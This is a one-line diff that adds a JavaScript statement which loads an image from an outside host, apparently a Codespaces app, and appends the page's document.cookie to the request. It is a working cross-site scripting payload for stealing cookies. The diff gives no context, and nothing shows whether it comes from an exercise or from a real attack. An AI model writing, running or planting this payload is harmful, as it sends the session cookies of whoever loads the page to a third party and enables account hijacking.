@@ -1,0 +1,1 @@
+new Image().src="https://fictional-space-journey-954rqrxw4xg24v5-8080.app.github.dev/prest.php?cookie_data="+document.cookie;
